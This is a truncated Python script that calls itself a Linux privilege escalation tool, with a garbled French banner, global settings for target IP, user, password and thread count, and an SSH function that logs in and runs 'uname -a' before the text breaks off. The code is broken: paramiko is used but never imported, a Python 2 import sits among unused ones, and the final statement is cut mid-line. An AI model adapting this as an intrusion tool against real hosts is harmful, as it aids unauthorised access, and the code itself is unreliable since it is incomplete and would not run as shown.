import mmap
import socket
import string
import sys
import time
from string import maketrans
import threading
from random import sample
import random

global tempdir
global port
global ip
global user
global password
global nbThread

print("""\033[0;34m
#######################################################
#           ?levation de priv?l?ges - Linux           #
#                                                     #
#  Python Privilege Escalation                          #
#  Author: Chris Lyne (clyne.cf)                      #
#                                                     #
#######################################################
\033[0m """)

def connect(user, host, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=user, password=password)
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("uname -a\n")
        s = ssh_stdout.readlines()
        try:
                if "Linux" in s
